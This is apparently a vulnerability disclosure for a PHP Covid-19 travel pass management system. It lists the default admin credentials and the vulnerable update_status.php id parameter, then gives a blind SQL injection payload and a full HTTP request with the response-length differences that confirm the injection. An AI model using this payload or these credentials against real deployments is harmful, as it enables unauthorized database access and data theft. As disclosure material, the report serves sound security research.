# Covid-19 Travel Pass Management System v1.0 by oretnom23 has SQL injection

Author： k0xx

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15308/covid-19-travel-pass-management-system-phpoop-free-source-code.html

Vulnerability File: /ctpms/admin/individuals/update_status.php?id=

Vulnerability location: /ctpms/admin/individuals/update_status.php?id=,id

[+] Payload: /ctpms/admin/individuals/update_status.php?id=2%27%20and%20length(database())%20=8--+ // Leak place ---> id

Current database name: ctpms_db,length is 8

```sql
GET /ctpms/admin/individuals/update_status.php?id=2%27%20and%20length(database())%20=8--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=sbd29ujtf9eelnf4f6rlt8ikfi
Connection: close
```
When length (database ()) = 7, Content-Length: 1819

![image](https://user-images.githubusercontent.com/54017627/167081855-77744532-764d-40cf-b777-525a89a1b388.png)

![image](https://user-images.githubusercontent.com/54017627/167081943-a7d9fcd1-3380-4314-bf7f-4b82456c93a4.png)

When length (database ()) = 8, Content-Length: 1828

![image](https://user-images.githubusercontent.com/54017627/167081786-c5f66ea9-71dd-4ad9-84c8-d5fec663896d.png)

![image](https://user-images.githubusercontent.com/54017627/167081912-cec200c0-60a9-4815-8bcd-6729e5a07a79.png)
